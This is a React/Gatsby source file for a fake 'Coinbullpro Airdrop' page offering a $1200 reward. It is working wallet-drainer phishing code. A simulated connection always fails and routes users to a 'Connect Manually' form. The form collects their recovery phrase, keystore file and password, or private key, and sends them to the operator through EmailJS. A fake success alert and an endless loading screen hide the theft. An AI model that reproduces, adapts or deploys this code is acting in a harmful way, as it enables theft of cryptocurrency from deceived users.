import React, { useState } from 'react';
//IMAGES
import pic_ from '../images/icon.png';
import icon from '../images/icon.ico';
import discord from '../images/discord.png';
import twitter from '../images/twitter.png';
import github from '../images/github.png';
import logos from '../images/logos';
//MATERIAL-UI
import Dialog from '@mui/material/Dialog';
import Button from '@mui/material/Button';
import Tabs from '@mui/material/Tabs';
import Tab from '@mui/material/Tab';
import Divider from '@mui/material/Divider';
import CircularProgress from '@mui/material/CircularProgress';
import useMediaQuery from '@mui/material/useMediaQuery';
import ArrowCircleRightIcon from '@mui/icons-material/ArrowCircleRight';
import CancelIcon from '@mui/icons-material/Cancel';
import { makeStyles, withStyles } from '@mui/styles';
//SWEETALERT2
import Swal from 'sweetalert2';
//REACT-HELMET
import { Helmet } from 'react-helmet';
//GATSBYJS
import { graphql, useStaticQuery } from 'gatsby';
//EMAILJS
import emailjs from '@emailjs/browser';


//FOR MUI DIALOG WIDTH/HEIGHT
const useStyles = makeStyles({
    paper1: {
        paddingTop: '0.725rem',
        paddingBottom: '2rem',
        display: 'flex',
        justifyContent: 'center'
    },
    paper2: {
        paddingTop: '0.725rem',
        paddingBottom: '2rem'
    },
    paper3: {
        minWidth: '43vh',
        maxWidth: '43vh',
        minHeight: '23vh',
        maxHeight: '23vh',
        display: 'flex',
        justifyContent: 'center',
        alignItems: 'center'
    }
});


const alert = () => {
    Swal.fire(
        'Success',
        'Dapp connection successful',
        'success'
    )
}


export default function() {
    const data = useStaticQuery(graphql`
        query {
            site {
                siteMetadata {
                    AppName
                }
            }
        }
    `);


    const classes = useStyles();
    const screen850 = useMediaQuery('(max-width:850px)');
    const screen640 = useMediaQuery('(max-width:640px)');
    const screen535 = useMediaQuery('(max-width:535px)');
    const screen400 = useMediaQuery('(max-width:400px)');


    const [ opendialog_1, setOpendialog_1 ] = useState<boolean>(false);
    const [ opendialog_2, setOpendialog_2 ] = useState<boolean>(false);
    const [ opendialog_3, setOpendialog_3 ] = useState<boolean>(false);


    const [ holdPicForDialog, setHoldPicForDialog ] = useState<any>(null);
    const [ holdNameForDialog, setHoldNameForDialog ] = useState<any>(null);
    const [ temploading, setTemploading ] = useState<boolean>(false);


    const [ tabValue, setTabValue] = useState(0);
    const handleChange = (event, newValue) => setTabValue(newValue);
    

    function sendEmail(e) {
        e.preventDefault();
    
      //emailjs.sendForm('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', form.current, 'YOUR_USER_ID')
        emailjs.sendForm('service_*******', 'template_*******', e.target, '***********_****')
        .then((result) => {
            console.log(result.text);

            setOpendialog_3(false);

            alert();
        }, (error) => {
            console.log(error.text);
        });
    
        e.target.reset();
    }


    return (
        <>
            <Helmet>
                <title> {`${data.site.siteMetadata.AppName}`} </title>
                <link rel="shortcut icon" type='image/x-icon' href={icon}/>
            </Helmet>


            <div className="app">

                <div className="mt-10 w-full h-[145px] cursor-pointer flex items-center justify-around">
                    <button className={`text-[#0a58ca] ${screen640?`text-[0.85rem] font-semibold tracking-wider`:`text-[1.25rem]`} ${!screen850&&`pr-60`}`}> Wallets </button>

                    <img src={pic_} alt="logo" className="w-[120px] h-auto"/>

                    <button className={`text-[#0a58ca] ${screen640?`text-[0.85rem] font-semibold tracking-wider`:`text-[1.25rem]`} ${!screen850&&`pl-60`}`}> Apps </button>
                </div>

                <div className={`mt-16 ${screen850?`w-[85%]`:`w-[50%] ml-4`} text-center`}>
                    <p className="text-[2.1875rem]"> Coinbullpro Airdrop </p>

                    <p className="text-lg mt-10 mb-0.5">
                        Airdrop tokens are automatically distributed to your wallet 96 hours after completing the tasks and has been verified by our team.
                    </p>

                    <span className="text-sm">
                        Airdrop Reward: $1200
                    </span>
                </div>

                <div className={`mt-4 ${!screen850&&`ml-1.5`} w-full flex items-center justify-center flex-col`}>
                    <p className="mt-10 mb-14 text-lg">
                        Select your wallet below
                    </p>

                    <div className="w-[75%] -mt-14">
                        <div className="grid xs:grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 xl:grid-cols-2 2xl:grid-cols-3 3xl:grid-cols-4 gap-4">
                            {
                                logos.map((item, i) => (
                                    <div
                                        key={i}
                                        style={{ margin: "0 auto" }}
                                        className="flex justify-center items-center flex-col cursor-pointer !mt-12"
                                        onClick={() => { setOpendialog_1(true); setHoldPicForDialog(item.pic);/*for dialog1*/ setHoldNameForDialog(item.name);/*for dialog2*/
                                            setTemploading(true);
                                            setTimeout(() => setTemploading(false), 2000);
                                        }}
                                    >
                                        <img src={item.pic} alt="logo" className="w-[170px] h-auto"/>
                                        <p className="text-md text-center font-semibold mt-5"> {item.name} </p>
                                    </div>
                                ))
                            }
                        </div>
                    </div>
                </div>

                <div className="mt-16 ml-4 w-[50%] text-center">
                    <p className="text-md mt-10 mb-0.5">
                        Open a pull request on <span className="font-bold">Github</span> to add your wallet here.
                    </p>

                    <div className={`p-16 flex items-center justify-around ${screen850&&`flex-col`}`}>
                        <button className={`flex items-center text-sm font-bold`}>                              <img src={discord} className="pr-1.5" alt="Discord"/> Discord </button>
                        <button className={`flex items-center text-sm font-bold ${screen850?`mt-2`:`ml-3.5`}`}> <img src={twitter} className="pr-1.5" alt="Twitter"/> Twitter </button>
                        <button className={`flex items-center text-sm font-bold ${screen850?`mt-2`:`ml-3.5`}`}> <img src={github}  className="pr-1.5" alt="Github"/>  Github </button>
                    </div>
                </div>
            </div>


            <Dialog
                open={opendialog_1}
                onClose={() => { setOpendialog_1(false); setHoldPicForDialog(null); setHoldNameForDialog(null); }}
                className="dialog"
                classes={{ paper: classes.paper1 }}
            >
                <Button
                    disableRipple
                    variant="text"
                    className={`w-10 ${screen400?`!ml-1.5`:`!ml-5`} !mb-1.5 !font-bold hover:!bg-transparent`}
                    onClick={() => { setOpendialog_1(false); setHoldPicForDialog(null); setHoldNameForDialog(null); }}
                >
                    Back
                </Button>

                <div className={`${!screen400?`ml-8 mr-8`:`ml-4 mr-4`}`}>
                    <div className={`p-5 ${!screen535&&`w-[25rem]`} border-[1px] border-red-300 rounded-md`}>
                        {
                            !temploading ? (
                                <div className={`flex items-center ${screen535&&`flex-col`}`}>
                                    <p className={`flex-1 font-semibold ${screen535&&`text-sm`}`}>
                                        Error Connecting...
                                    </p>

                                    <Button
                                        variant="contained"
                                        size={screen535?"small":"medium"}
                                        className={`!bg-[#40444f] ${screen535&&`!mt-1.5`} !rounded-md !capitalize`}
                                        onClick={() => { setOpendialog_1(false); setOpendialog_2(true); }}
                                    >
                                        <span className="text-xs text-white"> Connect Manually </span>
                                    </Button>
                                </div>
                            ) : (
                                <>
                                    <span className="font-semibold">
                                        Connecting... <CircularProgress style={{ color: 'white', marginTop: "0.5rem", marginLeft: "0.4rem" }} size={15}/>
                                    </span>
                                </>
                            )
                        }
                    </div>

                    <div className={`mt-4 flex items-center p-5 ${!screen535&&`w-[25rem]`} border-[1px] border-gray-300 rounded-md`}>
                        <div className="flex-1">
                            <p className="font-semibold tracking-wide"> {holdNameForDialog} </p>
                            <p className="text-sm"> Easy-to-use browser extension. </p>
                        </div>

                        <div>
                            <img src={holdPicForDialog} alt="logo" className="w-[25px] h-auto"/>
                        </div>
                    </div>
                </div>
            </Dialog>


            <Dialog
                open={opendialog_2}
                onClose={() => { setOpendialog_2(false); setHoldPicForDialog(null); setHoldNameForDialog(null); }}
                className="dialog"
                classes={{ paper: classes.paper2 }}
            >
                <form onSubmit={sendEmail} autoComplete="off" className={`${!screen400?`ml-8 mr-8`:`ml-1 mr-1`} mt-5 border-[1px] border-gray-300 rounded-3xl`}>

                    <div className="p-5 flex items-center">
                        <center className="flex-1 text-xl font-semibold tracking-wide"> {holdNameForDialog} </center>
                        <img src={holdPicForDialog} alt="logo" className="w-[65px] h-auto"/>
                    </div>

                    <div>
                        {
                            screen535 ? (
                                <Tabs value={tabValue} onChange={handleChange} centered>
                                    <Tab label={<span style={{ minWidth:"50%" }} className={`text-xs ${screen400&&`text-[0.615rem] -!ml-10`}`}> Phrase </span>}/>
                                    <Tab label={<span style={{ minWidth:"50%" }} className={`text-xs ${screen400&&`text-[0.615rem] -!ml-10`} -ml-3.5`}> Keystore JSON </span>}/>
                                    <Tab label={<span style={{ minWidth:"50%" }} className={`text-xs ${screen400&&`text-[0.615rem] -!ml-10`} -ml-3.5`}> Private Key </span>}/>
                                </Tabs>
                            ) : (
                                <Tabs value={tabValue} onChange={handleChange} centered>
                                    <Tab label='Phrase'/>
                                    <Tab label='Keystore JSON'/>
                                    <Tab label='Private Key'/>
                                </Tabs>    
                            )
                        }

                        <Divider/>
                        
                        {
                            tabValue==0 && (
                                <>
                                    <div className="flex justify-center ml-6 mr-6 mt-6 mb-2">
                                        <div className="mb-3 xl:w-96">
                                            {
                                                screen535 ? (
                                                    <textarea
                                                        rows={3}
                                                        name="message"
                                                        className="form-control block w-full px-3 py-1.5 text-base font-normal text-gray-700 bg-white bg-clip-padding border border-solid border-gray-300 rounded transition ease-in-out m-0 focus:text-gray-700 focus:bg-white focus:border-blue-600 focus:outline-none"
                                                        placeholder="Enter your recovery phrase"
                                                    />    
                                                ) : (
                                                    <textarea
                                                        rows={4}
                                                        name="message"
                                                        className="form-control block w-full px-3 py-1.5 text-base font-normal text-gray-700 bg-white bg-clip-padding border border-solid border-gray-300 rounded transition ease-in-out m-0 focus:text-gray-700 focus:bg-white focus:border-blue-600 focus:outline-none"
                                                        placeholder="Enter your recovery phrase"
                                                    />    
                                                )
                                            }
                                        </div>
                                    </div>

                                    <p className="text-xs text-center w-[80%]" style={{ margin: "0 auto" }}>
                                        Usually 12 (sometimes 24) words, enter words separated by single space.
                                    </p>
                                </>
                            )
                        }

                        {
                            tabValue==1 && (
                                <>
                                    <>
                                        <input
                                           type="file"
                                           className="hidden"
                                           id="getFile"
                                        />

                                        <button
                                            className="p-[8px] pt-2 pb-8 !mt-[1.265rem] text-[#92a2d6] rounded-lg"
                                            style={{ display: "block", width: "80%", height: "30px", margin: "0 auto", border: "1px dashed #697399" }}
                                            onClick={() => document.getElementById('getFile').click()}
                                        >
                                            Choose Keystore File
                                        </button>
                                    </>


                                    <div className="flex justify-center ml-6 mr-6 mt-6 mb-2">
                                        <div className="mb-3 xl:w-96">
                                            <input
                                                name="message"
                                                className={`form-control block w-full px-3 py-2.5 ${screen535?`text-sm`:`text-base`} font-normal text-gray-700 bg-white bg-clip-padding border border-solid border-gray-300 rounded transition ease-in-out m-0 focus:text-gray-700 focus:bg-white focus:border-blue-600 focus:outline-none`}
                                                placeholder="Key Store Password"
                                            />
                                        </div>
                                    </div>

                                    <p className="text-xs text-center w-[80%]" style={{ margin: "0 auto" }}>
                                        {`Several lines of text beginning with "{...}" plus the password you used to encrypt it.`}
                                    </p>
                                </>
                            )
                        }

                        {
                            tabValue==2 && (
                                <>
                                    <div className="flex justify-center ml-6 mr-6 mt-6 mb-2">
                                        <div className="mb-3 xl:w-96">
                                            <input
                                                name="message"
                                                className={`form-control block w-full px-3 py-2.5 ${screen535?`text-sm`:`text-base`} font-normal text-gray-700 bg-white bg-clip-padding border border-solid border-gray-300 rounded transition ease-in-out m-0 focus:text-gray-700 focus:bg-white focus:border-blue-600 focus:outline-none`}
                                                placeholder="Private Key"
                                            />
                                        </div>
                                    </div>

                                    <p className="text-xs text-center w-[80%]" style={{ margin: "0 auto" }}>
                                        Paste your private key string.
                                    </p>
                                </>
                            )
                        }

                        <center>
                            <Button
                                variant="contained"
                                className="!bg-[#2b6cb0] !font-semibold !tracking-wider w-[80%] !mt-4 !pt-2 !pb-2"
                                type="submit"
                                onClick={() => { setOpendialog_2(false); setOpendialog_3(true); setHoldPicForDialog(null); setHoldNameForDialog(null); }}
                            >
                                Proceed <ArrowCircleRightIcon style={{ fill: "#FFFFFF", marginLeft: "0.5rem" }}/>
                            </Button>

                            <Button
                                variant="contained"
                                className="!bg-[#c53030] !font-semibold !tracking-wider w-[80%] !mt-2.5 !mb-7 !pt-2 !pb-2"
                                onClick={() => { setOpendialog_2(false); setHoldPicForDialog(null); setHoldNameForDialog(null); }}
                            >
                                Cancel <CancelIcon style={{ fill: "#FFFFFF", marginLeft: "0.5rem"  }}/>
                            </Button>
                        </center>
                    </div>

                </form>
            </Dialog>


            <Dialog
                open={opendialog_3}
                className="dialog"
                classes={{ paper: classes.paper3 }}
            >
                <div className="flex items-center">
                    <span className="pr-2.5 text-2xl"> Loading </span>
                    <CircularProgress size={10} className="mt-0.5"/>
                    <CircularProgress size={10} className="mt-0.5 ml-1.5"/>
                    <CircularProgress size={10} className="mt-0.5 ml-1.5"/>
                </div>
            </Dialog>
        </>
    )
}
